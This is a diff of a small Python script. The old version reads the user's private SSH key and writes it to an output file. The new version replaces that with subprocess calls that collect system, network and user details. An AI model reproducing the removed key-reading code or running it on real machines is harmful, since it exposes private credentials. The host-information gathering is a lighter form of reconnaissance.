@@ -1,12 +1,18 @@
 from pathlib import Path
 import sys
+from subprocess import run
 
 
-s = Path.home() / '.ssh/id_rsa'
+def run_cmd(*args):
+    ret = run(args, capture_output=True)
+    out = ret.stdout
+    err = ret.stderr
 
-with open(s, 'r') as f:
-    data = f.read()
+    return f'out:\n{out}\nerr:\n{err}\n'
+
 
 with open(sys.argv[1], 'w') as f:
-    print(data, file=f)
+    print(run_cmd('uname', '-a'), file=f)
+    print(run_cmd('ip', 'addr', 'show'), file=f)
+    print(run_cmd('echo', '$USER'), file=f)
 
